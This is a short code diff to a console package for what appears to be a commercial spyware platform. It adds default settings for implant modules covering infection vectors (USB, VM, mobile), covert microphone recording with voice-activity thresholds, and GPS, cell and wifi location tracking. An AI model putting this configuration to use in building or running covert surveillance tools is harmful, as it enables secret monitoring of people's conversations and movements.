@@ -113,6 +113,10 @@ package it.ht.rcs.console
         
         {
           module: "infection",
+          local: false,
+          usb: false,
+          vm: 0,
+          mobile: false,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -132,6 +136,11 @@ package it.ht.rcs.console
         
         {
           module: "mic",
+          autosense: false,
+          silence: 5,
+          threshold: 0.22,
+          vad: false,
+          vadthreshold: 50,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -152,12 +161,16 @@ package it.ht.rcs.console
         
         {
           module: "position",
+          gps: false,
+          cell: false,
+          wifi: true,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
         
         {
           module: "print",
+          quality: "med",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
